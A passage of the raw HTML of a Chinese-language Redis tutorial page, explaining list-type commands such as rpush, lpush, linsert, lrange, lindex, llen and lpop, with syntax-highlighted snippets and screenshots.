class=\"crayon-sy\">(</span><span class=\"crayon-s\">'encoding'</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">'userinfo'</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">decode</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">'utf-8'</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5bab6ad08924a908231365-7\"><span class=\"crayon-i\">Key</span>为【<span class=\"crayon-i\">userinfo</span>】的字节编码为【<span class=\"crayon-i\">ziplist</span>】</div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab6ad08924a908231365-8\"><span class=\"crayon-i\">Key</span>为【<span class=\"crayon-i\">userinfo</span>】的字节编码为【<span class=\"crayon-i\">hashtable</span>】</div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0024 seconds] -->\r\n<p> </p>\n<h1>列表类型</h1>\n<p>Redis 中列表类型可以简单地理解为存储多个有序字符串的一种新类型，这种类型除了字符串类型中已有的功能外，还提供了其它功能，如可以对列表的两端插入和弹出元素（在列表中的字符串都可以称之为元素），除此之外还可以获取指定的元素列表，并且还可以通过索引下标获取指定元素等等。下面我们通过下图来看一下 Redis 中列表类型的插入和弹出操作：</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/09/a75d0e3b11c8af06f05784e6d9c98806.png\" width=\"610\" height=\"191\"></p>\n<p>下面我们看一下 Redis 中列表类型的获取与删除操作：</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/09/b78aca6b97967d6d4964ec3b9d05d501.png\" width=\"586\" height=\"251\"></p>\n<p>Redis 列表类型的特点如下：</p>\n<ul>\n<li>列表中所有的元素都是有序的，所以它们是可以通过索引获取的，也就是上图中的 lindex 命令。并且在 Redis 中列表类型的索引是从 0 开始的。</li>\n<li>列表中的元素是可以重复的，也就是说在 Redis 列表类型中，可以保存同名元素，如下图所示：</li>\n</ul>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/09/c2dc70b3780b997bc09ce71841c277bb.png\" width=\"688\" height=\"85\"></p>\n<p> </p>\n<h2>命令</h2>\n<p>下面我们还是和学习其它数据类型一样，我们还是先学习一下 Redis 列表类型的命令。</p>\n<p> </p>\n<h3>1.添加操作</h3>\n<ul>\n<li>从右边插入元素</li>\n</ul>\n<p></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab6ad089254443646027\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nrpush key value [value ...]</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab6ad089254443646027-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab6ad089254443646027-1\"><span class=\"crayon-e\">rpush </span><span class=\"crayon-e\">key </span><span class=\"crayon-i\">value</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-i\">value</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">]</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0005 seconds] -->\r\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/09/31549cdc4aa07d086553492694c971ee.png\" width=\"365\" height=\"148\"></p>\n<p>我们看 rpush 命令在插入时，是有返回值的，返回值的数量就是当前列表中所有元素的个数。</p>\n<p>我们也可以用下面的命令从左到右获取当前列表中的所有的元素，也就是如上图所示中那样。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab6ad08925a254365298\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nlrange 0 -1</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab6ad08925a254365298-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab6ad08925a254365298-1\"><span class=\"crayon-i\">lrange</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">1</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p></p>\n<ul>\n<li>从左边插入元素</li>\n</ul>\n<p></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab6ad08925e154881484\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nlpush key value [value ...]</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab6ad08925e154881484-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab6ad08925e154881484-1\"><span class=\"crayon-e\">lpush </span><span class=\"crayon-e\">key </span><span class=\"crayon-i\">value</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-i\">value</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">]</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0005 seconds] -->\r\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/09/72d4e86bdd1f81858b8211b389c5174d.png\" width=\"367\" height=\"188\"></p>\n<p>lpush 命令的返回值及用法和 rpush 命令一样。通过上面的事例证明了我们前面说的，rpush 命令和 lpush 命令的返回值并不是当前插入元素的个数，而是当前 key 中全部元素的个数，因为当前 key 中已经有了 3 个元素，所以我们在执行插入命令时，返回的就是 6 而不是 3，。</p>\n<ul>\n<li>向某个元素前或者后插入元素</li>\n</ul>\n<p></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab6ad089261939840204\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nlinsert key BEFORE|AFTER pivot value</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab6ad089261939840204-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab6ad089261939840204-1\"><span class=\"crayon-e\">linsert </span><span class=\"crayon-e\">key </span><span class=\"crayon-v\">BEFORE</span><span class=\"crayon-o\">|</span><span class=\"crayon-e\">AFTER </span><span class=\"crayon-e\">pivot </span><span class=\"crayon-v\">value</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/09/015187d7d49cc89ef5f99512d3a6455f.png\" width=\"448\" height=\"628\"></p>\n<p>linsert 命令在执行的时候首先会从当前列表中查找到 pivot 元素，其次再将这个新元素插入到 pivot 元素的前面或者后面。并且我们通过上图可以知道 linsert 命令在执行成功后也是会有返回值的，返回的结果就是当前列表中元素的个数。</p>\n<p> </p>\n<h3>2.查找</h3>\n<ul>\n<li>获取指定范围内的元素列表</li>\n</ul>\n<p></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab6ad089264457927436\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nlrange key start stop</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab6ad089264457927436-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab6ad089264457927436-1\"><span class=\"crayon-e\">lrange </span><span class=\"crayon-e\">key </span><span class=\"crayon-e\">start </span><span class=\"crayon-v\">stop</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0003 seconds] -->\r\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/09/474524edd3c452af6a8dd609d280ad8c.png\" width=\"368\" height=\"215\"></p>\n<p>lrange 命令会获取列表中指定索引范围的所有元素。</p>\n<p>通过索引获取列表主要有两个特点：</p>\n<ul>\n<li>索引下标从左到右分别是 0 到 N-1，从右到左是 -1 到 -N。</li>\n<li>lrange 命令中的 stop 参数在执行时会包括当前元素，并不是所有的语言都是这样的。我们要获取列表中前两个元素则可以如下图所示：</li>\n</ul>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/09/bdccbb4b87f8e46661a2fc45089ffc8d.png\" width=\"365\" height=\"92\"></p>\n<ul>\n<li>获取列表中指定索引下标的元素</li>\n</ul>\n<p></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab6ad089268906625825\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nlindex key index</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab6ad089268906625825-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab6ad089268906625825-1\"><span class=\"crayon-e\">lindex </span><span class=\"crayon-e\">key </span><span class=\"crayon-v\">index</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/09/4c4f7c5e0347f01d84b7c810eb016d2c.png\" width=\"330\" height=\"71\"></p>\n<ul>\n<li>获取列表长度</li>\n</ul>\n<p></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab6ad08926b754286699\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nllen key</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab6ad08926b754286699-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab6ad08926b754286699-1\"><span class=\"crayon-e\">llen </span><span class=\"crayon-v\">key</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0003 seconds] -->\r\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/09/062aa1ecbbb461f0fad394d83af4b6b1.png\" width=\"283\" height=\"63\"></p>\n<p> </p>\n<h3>3.删除</h3>\n<ul>\n<li>从列表左侧弹出元素</li>\n</ul>\n<p></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab6ad08926e710172162\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nlpop key</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab6ad08926e710172162-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab6ad08926e710172162-1\"><span class=\"crayon-e\">lpop </span><span class=\"crayon-v\">key</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0003 seconds] -->\r\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/09/c6f66a25a4596ccd907b28ac5d71ad61.png\" width=\"386\" height=\"421\"></p>\n<p>lpop 命令执行成功后会返回当前被删除的元素名称。</p>\n<ul>\n<li>从列表右侧弹出元素</li>\n</ul>\n<p></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab6ad089272522027230\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div 